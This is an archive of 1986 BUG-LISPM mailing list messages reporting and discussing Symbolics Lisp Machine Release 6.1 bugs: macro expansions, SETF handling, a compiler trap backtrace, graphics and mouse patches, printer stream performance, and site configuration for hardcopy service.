From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Correction to last message.
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12195434105.43.KT@XX.LCS.MIT.EDU>

Please ignore my previous message.  What I meant to say was that in
Rel 6.1 Common Lisp, WITH-INPUT-FROM-STRING evaluates its string
argument twice.

Sorry about that.
				--- Ken
-------
 2-Apr-86 10:26:04-EST,1276;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 2 Apr 86 10:25-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU  2 Apr 86 10:18:00 EST
Received: from FIREBIRD.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 10841; Wed 2-Apr-86 10:16:23-EST
Date: Wed, 2 Apr 86 10:16 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Minor bug in Rel 6.1 Common Lisp
To: Ken Traub <KT@XX.LCS.MIT.EDU>, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <12195433841.43.KT@XX.LCS.MIT.EDU>
Message-ID: <860402101619.8.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Tue 1 Apr 86 16:18:54-EST
    From: Ken Traub <KT@XX.LCS.MIT.EDU>

    In Rel 6.1 Common Lisp, WITH-OPEN-STREAM evaluates its string argument
    twice.

String argument?  Maybe you mean construction form.  A macroexpansion
would be helpful.  In the pre-Release 7 world I get this macroexpansion:

	(with-open-stream (foo (make-a-stream))
	  (print foo))
	=> (LET ((SI:.STREAM-ABORT-FLAG. ':ABORT)
		 (FOO (MAKE-A-STREAM)))
	     (UNWIND-PROTECT (MULTIPLE-VALUE-PROG1 (PROGN (PRINT FOO))
						   (SETQ SI:.STREAM-ABORT-FLAG. NIL))
	       (SI:CLOSE-OPEN-STREAM FOO SI:.STREAM-ABORT-FLAG.)))

As you can see, MAKE-A-STREAM only gets called once.

 2-Apr-86 20:16:18-EST,918;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 2 Apr 86 20:15-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27544; Wed 2-Apr-86 20:16:30-EST
Date: Wed, 2 Apr 86 20:14 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Can't make declarations within a using-resource
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860402201449.1.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

using-resource expands such that 

(using-resource (mumble mumblefrots)
  (declare (mumbler mumble))
  ...)

is illegal. 

It would be nice if I could make a declare simply inside a
using-resource.
 3-Apr-86 13:04:30-EST,839;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Apr 86 13:04-EST
Received: from DUANE.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27593; Thu 3-Apr-86 12:31:04-EST
Date: Thu, 3 Apr 86 12:29 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: lambda doesn't work in the interpreter, either
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860403122908.2.ZVONA@DUANE.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.2, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Duane Allman:

If you ask me real nice, I may isolate a minimal test case.  Since you
aren't fixing the compiler, I'm not real motivated.
 3-Apr-86 13:07:45-EST,1451;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Apr 86 13:07-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU  3 Apr 86 13:07:51 EST
Received: from FIREBIRD.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 11118; Thu 3-Apr-86 13:05:56-EST
Date: Thu, 3 Apr 86 13:05 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Can't make declarations within a using-resource
To: Chris Lindblad <CJL@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860402201449.1.CJL@OTIS.AI.MIT.EDU>
Message-ID: <860403130548.6.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Wed, 2 Apr 86 20:14 EST
    From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
    FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
    FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

    using-resource expands such that 

    (using-resource (mumble mumblefrots)
      (declare (mumbler mumble))
      ...)

    is illegal. 

    It would be nice if I could make a declare simply inside a
    using-resource.

Interesting screw.  Unfortuantely, the expansion (at least the Release 7
expansion) is the safest w.r.t. c-Abort.  I might be able to dream up
some ugly contoration that might work.

 3-Apr-86 15:21:23-EST,1364;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Apr 86 15:18-EST
Received: from KILLINGTON.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 30292; Thu 3-Apr-86 15:12:58-EST
Date: Thu, 3 Apr 86 15:12 EST
From: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>
Subject: TV:BITBLT-CLIP fails with negative extents
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860403151251.1.RWS@KILLINGTON.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.13, MLSite 13.1,
Experimental DVI 1.1, Experimental Schema 109.12, Experimental XML 2.0,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Killington:

TV:BITBLT-CLIP computes the bottom and/or right overrun incorrectly when
the height and/or width is negative.  The typical result in such a case
is that BITBLT throws you into the debugger.  The absolute values of
width and height should be used, that is

  `(LET* ( ...
	  (RIG-OVERRUN (MAX 0 (- (+ ,TO-X (ABS ,WID)) ,TO-LIMIT-WID)))
	  (BOT-OVERRUN (MAX 0 (- (+ ,TO-Y (ABS ,HEI)) ,TO-LIMIT-HEI))))

instead of

  `(LET* ( ...
	  (RIG-OVERRUN (MAX 0 (- (+ ,TO-X ,WID) ,TO-LIMIT-WID)))
	  (BOT-OVERRUN (MAX 0 (- (+ ,TO-Y ,HEI) ,TO-LIMIT-HEI))))
 3-Apr-86 15:34:09-EST,1531;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Apr 86 15:33-EST
Received: from KILLINGTON.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 30298; Thu 3-Apr-86 15:32:33-EST
Date: Thu, 3 Apr 86 15:32 EST
From: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>
Subject: getting mouse button-ups
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860403153229.2.RWS@KILLINGTON.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.13, MLSite 13.1,
Experimental DVI 1.1, Experimental Schema 109.12, Experimental XML 2.0,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Killington:

Is there a compelling reason why the :mouse-buttons method is not given
mouse button-ups as well as button-downs?  I want to be able to react
to button-ups, and within my application it is unreasonable to have to
dedicate a process to spinning on WAIT-FOR-MOUSE.

The change to MOUSE-DEFAULT-HANDLER would seem trivial.  Instead of

    (COND ((OR (ZEROP BD) (EQ WINDOW T) OLD-OWNER))
	  ;; If over an exposed window, send it the button-push
	  (WINDOW (FUNCALL WINDOW BUTTONS-METHOD BD WINDOW-X WINDOW-Y))
	  ...
do

    (COND ((OR (AND (ZEROP BU) (ZEROP BD)) (EQ WINDOW T) OLD-OWNER))
	  ;; If over an exposed window, send it the button-push/release
	  (WINDOW (FUNCALL WINDOW BUTTONS-METHOD BU BD WINDOW-X WINDOW-Y))
	  ...
 3-Apr-86 16:46:02-EST,2099;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Apr 86 16:45-EST
Received: from SCRC-QUABBIN.ARPA by MC.LCS.MIT.EDU  3 Apr 86 16:46:04 EST
Received: from CERRIDWYN.SSF.Symbolics.COM by SCRC-QUABBIN.ARPA via CHAOS with CHAOS-MAIL id 260969; Thu 3-Apr-86 16:43:54-EST
Received: from MEDUSA.SSF.Symbolics.COM by CERRIDWYN.SSF.Symbolics.COM via CHAOS with CHAOS-MAIL id 79606; Thu 3-Apr-86 13:43:37-PST
Date: Thu, 3 Apr 86 13:43 PST
From: Richard Lamson <rsl@RUSSIAN.SPA.Symbolics.COM>
Subject: Minor bug in Rel 6.1 Common Lisp
To: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>,
    Ken Traub <KT@XX.LCS.MIT.EDU>, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <860402101619.8.DCP@FIREBIRD.SCRC.Symbolics.COM>
Message-ID: <860403134307.6.RSL@MEDUSA.SSF.Symbolics.COM>
Reply-To: RSL@SCRC-STONY-BROOK.ARPA

    Date: Wed, 2 Apr 86 10:16 EST
    From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>

	Date: Tue 1 Apr 86 16:18:54-EST
	From: Ken Traub <KT@XX.LCS.MIT.EDU>

	In Rel 6.1 Common Lisp, WITH-OPEN-STREAM evaluates its string argument
	twice.

    String argument?  Maybe you mean construction form.  A macroexpansion
    would be helpful.  In the pre-Release 7 world I get this macroexpansion:

Try WITH-INPUT-FROM-STRING:

(cl:with-input-from-string (foo (bar))
  (mumble foo)) 
=> (WITH-STACK-LIST
     (#:G0014 (BAR) 0 (ARRAY-ACTIVE-LENGTH (BAR)))
     (LET (FOO)
       (CL:SETF FOO
		(FUNCTION (LAMBDA (SCL::OPERATION &REST SCL::ARGS)
			    (DECLARE (SYS:DOWNWARD-FUNCTION))
			    (CL:APPLY (FUNCTION SCL::INPUT-FROM-STRING-STREAM)
				      SCL::OPERATION
				      #:G0014
				      FOO
				      SCL::ARGS))))
       (MULTIPLE-VALUE-PROG1 (PROGN (MUMBLE FOO)) NIL)))



	    (with-open-stream (foo (make-a-stream))
	      (print foo))
	    => (LET ((SI:.STREAM-ABORT-FLAG. ':ABORT)
		     (FOO (MAKE-A-STREAM)))
		 (UNWIND-PROTECT (MULTIPLE-VALUE-PROG1 (PROGN (PRINT FOO))
						       (SETQ SI:.STREAM-ABORT-FLAG. NIL))
		   (SI:CLOSE-OPEN-STREAM FOO SI:.STREAM-ABORT-FLAG.)))

    As you can see, MAKE-A-STREAM only gets called once.


 4-Apr-86 13:19:23-EST,3556;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 13:19-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27664; Fri 4-Apr-86 13:21:11-EST
Date: Fri, 4 Apr 86 13:19 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Performance Critique of LGP2 Streams
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860404131908.9.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.2, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

I have an application (printing dvi files) which uses a lot of fonts
(~25) and a lot of page positioning (about once every 4 characters) and
have discovered that the implementation of lgp2 streams is much slower
than it should be. Printer streams that I have implemented (qms and
imagen) are about 4 times faster to generate then lgp2 streams.

The use of Points as the device unit for lgp2 printers forces the use of
floats in expressing page positions and character widths. This
significantly slows the printing of documents, because of the speed of
floating point operations, the extensive coercions required, and
because there are many equality checks in the printer code, where
floating point equality is not necessary, but anywhere close to 1/1000
of an inch is good enough. For example, the check-cursorpos method of
basic-hardcopy-stream, which is a mixin for lgp2-text-stream uses = to
compare cursor positions. Comparing two floats with = is not always a
good idea.

(DEFMETHOD (BASIC-HARDCOPY-STREAM :CHECK-CURSORPOS) ()
  (WHEN (NOT (AND (= CURSOR-X DEVICE-CURSOR-X) (= CURSOR-Y DEVICE-CURSOR-Y)))
    (SEND SELF ':SET-DEVICE-CURSORPOS)))

I think device units should have been micas, or at least an integer
value of 1/1000 of a point. I suspect performance would be greatly
improved if floats weren't used as extensively.

The size of the output file generated is also very large. Part of this
is due to the number of ()pop commands in the file to work around
laserwriter brain damage. Could the number of ()pop commands be reduced
from once every page positioning command? With one page positioning
command approximately every 4 characters (even more if floats are used),
the output file becomes mostly ()pop commands. Also the use of a newline
AND a blank after every command should be reduced to just a newline, or
better yet, just blank, except when the line is getting long enough to
warrant a newline.

Page buffers are very slow. I think that 1000 bytes is too small for an
initial size of a page buffer. A lot of array extending occurs. I would
suggest 16384 bytes.  Page buffers should also be allocated out of a
temporary area which can be reset when the last page buffer is
deallocated, reducing the amount of gc overhead for printing a file.

Joseph told me he was considering having font characters being
downloaded and managed on a per page basis, instead of a per file basis,
because of brain damage in the laserwriter. I think this is a great idea
and would really like to see this happen. DVI files of even a medium
amount of complexity that print fine on other printers cause stack
overflow and memory allocation errors on the laserwriter. This is
actually more critical than the other problems, because it causes files
to be not ptinted at all instead of printed very slowly.
 4-Apr-86 15:28:46-EST,1361;000000000000
Received: from MERLIN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 15:28-EST
Date: Fri, 4 Apr 86 15:28 EST
From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>
Subject: trouble with SETF
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860404152832.1.DICK@MERLIN.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.2, microcode TMC5-COL-MIC 353, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on PA Lisp Machine Merlin:

In Common Lisp, evaluate the following set of definitions

    (declare (special control))
    
    (defmacro foo (x) `(bar ,x))
    
    (defun bar (x) (car x))
    
    (defmacro bar-setf (x z)
      (case control
	(0 `(zot ,x ,z))
	(1 `(zot ,z))
	(2 `(zot ,x))
	(3 `zot)))
    
    (defsetf bar bar-setf))


Then exectute

(dolist (control '(0 1 2 3))
  (print (macroexpand-1 '(setf (foo a) b))))

this produces the output:

(zot a b)
(zot b)
(zot a)
(bar-setf #:G0001 #:G0002)

Note the odd last result which should have been ZOT
Also note that for some reason the following works just fine.  
Why aren't the two the same?

(dolist (control '(0 1 2 3))
  (print (macroexpand-1 '(setf (bar a) b))))

produces

(bar-setf a b)
(bar-setf a b)
(bar-setf a b)
(bar-setf a b)


					Dick Waters
 4-Apr-86 16:05:52-EST,1868;000000000000
Received: from MERLIN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 16:05-EST
Date: Fri, 4 Apr 86 16:05 EST
From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>
Subject: another problem with setf
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860404160521.2.DICK@MERLIN.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.2, microcode TMC5-COL-MIC 353, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on PA Lisp Machine Merlin:

Evaluate the following forms in Common Lisp.

	(defmacro foo (x type) `(bar ,x ,type))
	(defun bar (x type) (case type (:car (car x)) (:cdr (cdr x))))
	(defmacro bar-setf (x type value)
	  (print (list x type value))
	  (case type
	    (:car `(rplaca ,x ,value))
	    (:cdr `(rplaca ,x ,value))
	    (otherwise `(error ,x ,value))))
	(defsetf bar bar-setf)


Then evaluate

(macroexpand-1 '(setf (foo a :car) 2))

you get

(#:G0001 #:G0002 #:G0003)
(#:G0001 #:G0002 #:G0003)
(ERROR A 2)

It appears that setf is making the unwarranted assumption that you can substitute
gensyms for the arguments to a macro and macroexpandit and then substitute in the
actual values for the gensyms.  This is not true for example when one of the arguments
is a keyword!

For some reason the following works just fine.
why doesn't setf do the same thing in both cases?

(macroexpand-1 '(setf (bar a :car) 2))

produces

(bar-setf a :car 2)


Note that I think that this is a quite separate problem with setf from the one I
sent in a few minutes ago.  I need to have both of them fixed for the setf 
property I am trying to define to work.


Also using define-setf-method does not help, because although it does not have this
problem.  It does have the other problem just as much as defsetf.

				Dick Waters
 4-Apr-86 17:11:06-EST,3219;000000000000
Received: from ELVIS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 17:10-EST
Date: Fri, 4 Apr 86 17:10 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: compiler blowout
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860404171046.7.ZVONA@ELVIS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.2, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-loaders.flod(2),
FEP0:>v127-info.flod(2), on Lisp Machine Elvis Presley:
Warm booted from: Lisp Listener 2.

This is a little graceless.  There seems to be code to generate a
warning instead, but it doesn't work if there is more than one bv.

>>Trap: The argument given to the CAR instruction, BAZ, was not a locative, a list, or NIL.
While in the function COMPILER:PROCESS-VVLIST  COMPILER:PHASE-1-LET  (:PROPERTY
                                                                        LET
                                                                        COMPILER:PHASE-1)
While compiling FOO

COMPILER:PROCESS-VVLIST:  (P.C. = 61)
   Arg 0 (COMPILER:VVLIST): ((BAR . BAZ) (QUUX 1))
   Arg 1 (COMPILER:PARALLEL-P): T
   Arg 2 (COMPILER:NEW-LOCAL-DECLARATIONS): NIL
   Local 3: COMPILER:PHASE-1
   Local 4: #<DTP-ODD-PC 22167432>
   Local 5: #<DTP-LOCATIVE 36200452>
   Local 6: #<DTP-LOCATIVE 43440663>
   Local 7 (COMPILER:INIT-FORM-LOCAL-DECLARATIONS): NIL
   Local 8: #<DTP-COMPILED-FUNCTION COMPILER:PARALLEL-LET 22166720>
   Local 9 (COMPILER:VV): (BAR . BAZ)
   Local 10: ((QUUX 1))

COMPILER:PHASE-1-LET:  (P.C. = 30)
   Arg 0 (COMPILER:BODY): (((BAR . BAZ) (QUUX 1)))
   Arg 1 (COMPILER:DESTINATION): RETURN
   Arg 2 (COMPILER:PARALLEL-P): T

(:PROPERTY LET COMPILER:PHASE-1):  (P.C. = 5)
   Arg 0 (COMPILER:BODY): (((BAR . BAZ) (QUUX 1)))
   Arg 1 (COMPILER:DESTINATION): RETURN

COMPILER:PHASE-1:  (P.C. = 347)
   Arg 0 (COMPILER:FORM): (LET ((BAR . BAZ) 
                                (QUUX 1)))
   Arg 1 (COMPILER:DESTINATION): RETURN
   --Defaulted args:--
   Arg 2 (COMPILER:DO-TRANSFORM): T
   Arg 3 (COMPILER:FORM-IS-ARGUMENT-P): NIL

Rest of stack:
COMPILER:PHASE-1-PROGN:  (P.C. = 27)
COMPILER:PHASE-1-FUNCTION-DEFINITION:  (P.C. = 317)
COMPILER:PHASE-1-EXTERNAL-FUNCTION:  (P.C. = 35)
COMPILER:RUN-PHASE-1-FUNCTION:  (P.C. = 73)
COMPILER:COMPILE-DEFINITION-1:  (P.C. = 10)
COMPILER:COMPILE-DEFINITION:  (P.C. = 122)
(:INTERNAL COMPILER:COMPILE-TO-CORE 0 (:DUMP-DEFINITION)):  (P.C. = 5)
COMPILER:COMPILE-TO-CORE:  (P.C. = 12)
COMPILER:COMPILE-FORM-FUNCTION:  (P.C. = 41)
COMPILER:COMPILE-FROM-STREAM-1:  (P.C. = 330)
COMPILER:PROCESS-FORMS-FROM-STREAM:  (P.C. = 117)
COMPILER:COMPILE-FROM-STREAM:  (P.C. = 237)
ZWEI:COMPILE-INTERVAL:  (P.C. = 142)
ZWEI:COMPILE-PRINT-INTERVAL:  (P.C. = 121)
ZWEI:COMPILE-DEFINITION-INTERNAL:  (P.C. = 100)
ZWEI:COM-COMPILE-REGION:  (P.C. = 5)
ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
 4-Apr-86 17:59:03-EST,2131;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 17:58-EST
Received: from SCRC-QUABBIN.ARPA by MC.LCS.MIT.EDU  4 Apr 86 17:50:05 EST
Received: from FIREBIRD.SCRC.Symbolics.COM by SCRC-QUABBIN.ARPA via INTERNET with SMTP id 261278; 4 Apr 86 11:49:56-EST
Date: Fri, 4 Apr 86 11:50 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Minor bug in Rel 6.1 Common Lisp
To: RSL@SCRC-STONY-BROOK.ARPA, David C. Plummer <DCP@SCRC-QUABBIN.ARPA>,
    Ken Traub <KT@XX.LCS.MIT.EDU>, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <860403134307.6.RSL@MEDUSA.SSF.Symbolics.COM>
Message-ID: <860404115012.6.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Thu, 3 Apr 86 13:43 PST
    From: Richard Lamson <rsl@RUSSIAN.SPA.Symbolics.COM>

	Date: Wed, 2 Apr 86 10:16 EST
	From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>

	    Date: Tue 1 Apr 86 16:18:54-EST
	    From: Ken Traub <KT@XX.LCS.MIT.EDU>

	    In Rel 6.1 Common Lisp, WITH-OPEN-STREAM evaluates its string argument
	    twice.

	String argument?  Maybe you mean construction form.  A macroexpansion
	would be helpful.  In the pre-Release 7 world I get this macroexpansion:

    Try WITH-INPUT-FROM-STRING:

    (cl:with-input-from-string (foo (bar))
      (mumble foo))
    => (WITH-STACK-LIST
	 (#:G0014 (BAR) 0 (ARRAY-ACTIVE-LENGTH (BAR)))
	 (LET (FOO)
	   (CL:SETF FOO
		    (FUNCTION (LAMBDA (SCL::OPERATION &REST SCL::ARGS)
				(DECLARE (SYS:DOWNWARD-FUNCTION))
				(CL:APPLY (FUNCTION SCL::INPUT-FROM-STRING-STREAM)
					  SCL::OPERATION
					  #:G0014
					  FOO
					  SCL::ARGS))))
	   (MULTIPLE-VALUE-PROG1 (PROGN (MUMBLE FOO)) NIL)))

In Release 7 (BAR) is only called once:
=> 
(LET ((#:G6292 (BAR)))
  NIL
  (WITH-STACK-LIST (#:G6290 #:G6292 0
                    (VALUES (OR NIL
                                (STRING-LENGTH #:G6292)))
                    0)
    (WITH-STACK-LIST* (#:G6291 #:G6290 #'CLI::STRING-INPUT-STREAM)
      (MULTIPLE-VALUE-PROG1 (LET ((FOO (ZL:%MAKE-POINTER SYS:DTP-LEXICAL-CLOSURE #:G6291)))
                              (MUMBLE FOO))
                            NIL)))) 


 4-Apr-86 18:33:28-EST,6641;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 18:33-EST
Received: by EDDIE (5.31/4.7)
	id AA19612; Fri, 4 Apr 86 18:31:22 EST
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA03033; Fri, 4 Apr 86 18:34:57 EST
Received: from SCRC-QUABBIN.ARPA by MC.LCS.MIT.EDU  4 Apr 86 18:33:44 EST
Received: from GODZILLA.SCH.Symbolics.COM by SCRC-QUABBIN.ARPA via CHAOS with CHAOS-MAIL id 261463; Fri 4-Apr-86 18:03:36-EST
Received: from PUFF.SCH.Symbolics.COM by GODZILLA.SCH.Symbolics.COM via CHAOS with CHAOS-MAIL id 177801; Fri 4-Apr-86 15:04:17-PST
Date: Fri, 4 Apr 86 15:02 PST
From: Kyra Lowther <toto@GODZILLA.SCH.Symbolics.COM>
Subject: getting Term-Q to work
To: STRAZ@MEDIA-LAB.MIT.EDU
Cc: BUG-LISPM@MEDIA-LAB.MIT.EDU
In-Reply-To: <860313204210.1.STRAZ@ZAXXON.ARPA>
Message-Id: <860404150220.1.TOTO@PUFF.SCH.Symbolics.COM>

    Date: Thu, 13 Mar 86 20:42 EST
    From: Steve Strassmann <STRAZ@MEDIA-LAB.MIT.EDU>

    In Symbolics 3600 Release 6.1, Netrender (DS) 1.12, COLOR 135.55,
    COLOR-DEMO 68.10, Paint (DS) 8.0, Menu 6.1,
    Experimental Color Editor 5.1, IMAGES 56.25, COLOR-EXTENSIONS 4.6,
    BS-FONTS 4.2, Tablet (DS) 3.7, Live Window 272.0, Dynamics (DS) 7.15,
    Render (DS) 15.6, COLOR-PALETTE 2.1, Geometry (DS) 7.40, Demo-Band 63.0,
    Experimental TMC 3d Image Toolkit 71.0, IP-TCP 29.13, DECTALK 1.1,
    Experimental PROSE 1.0, Japanese 24.1, microcode TMC5-COLOR-MIC 336,
    FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(3),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), Bug Report Recipient, on Zaxxon:

    Function-Q has never worked at AMT; I have now finally gotten around to
    complaining about it. I have enclosed entries from "sys:site;amt-objects.text" 
    which mention the string "printer", plus the error backtrace. What's wrong?

    We currently have a DEC LN01 hanging off ATRP. In the near future we
    anticipate gatewaying our ethernet to an Appletalk net with several
    Laserwriters. How should we hack the namespace?

The first problem is that the hardcopy service is only defined for CHAOS, so 
the invention:  SERVICE HARDCOPY TCP LGP is a nice try, but won't work.

The second problem is that the DEC LN01 is not a supported printer.  You 
might ask around on the SLUG mailing list to see if anyone has written code 
for it.  The Laserwriter (LGP-2 in Symbolics Speak) is a supported printer, 
so you'll just need to get the LGP-2 software to make Function-Q work with 
that.

The third problem (which may be a moot point by now) is that the printer is 
hanging off a UNIX VAX.  Hardcopy service is not supported for printers on 
VAXen running UNIX.  When you get the Laserwriters, hang one off the Lispm
rather than trying to access it on the net.

    Can Function-Q work with the color screen? The most naiive of
    implementations would be very useful.

I don't think anything has been written for this.  

    Also, I can refer to some Internet hosts (XX, REAGAN, MC) and not others
    (AP, AP5, BUDDY-HOLLY). Why not?
    ==============================================================================
    Excerpts from "sys:site;amt-objects.text":

    SITE AMT
    LOCAL-NAMESPACE AMT
    SITE-DIRECTORY XEVIOUS:>sys>site>
    TIMEZONE EST
    HOST-FOR-BUG-REPORTS MEDIA-LAB
    PRETTY-NAME "Media Technology"
    DEFAULT-PRINTER LP
    DEFAULT-BITMAP-PRINTER LP
    HOST-PROTOCOL-DESIRABILITY MEDIA-LAB SMTP .9
    HOST-PROTOCOL-DESIRABILITY MEDIA-LAB CHAOS .9
    USER-PROPERTY DEFAULT-SAMPLE-RATE 16000

    HOST MIT-ATRP
    SYSTEM-TYPE UNIX42
    SITE AMT
    SHORT-NAME ATRP
    MACHINE-TYPE "VAX 11/780"
    PRETTY-NAME "High Resolution Video Mania"
    ADDRESS INTERNET 18.85.0.3
    SERVICE FILE TCP TCP-FTP
    SERVICE LOGIN TCP TELNET
    SERVICE HARDCOPY TCP LGP
    SERVICE MAIL-TO-USER TCP SMTP
    PRINTER LP
    BITMAP-PRINTER LP

    PRINTER LP
    TYPE LGP
    HOST MIT-ATRP
    FORMAT ASCII
    PROTOCOL LGP
    INTERFACE SERIAL
    ==============================================================================
    >>Error: Protocol :LGP does not have a TCP port number.
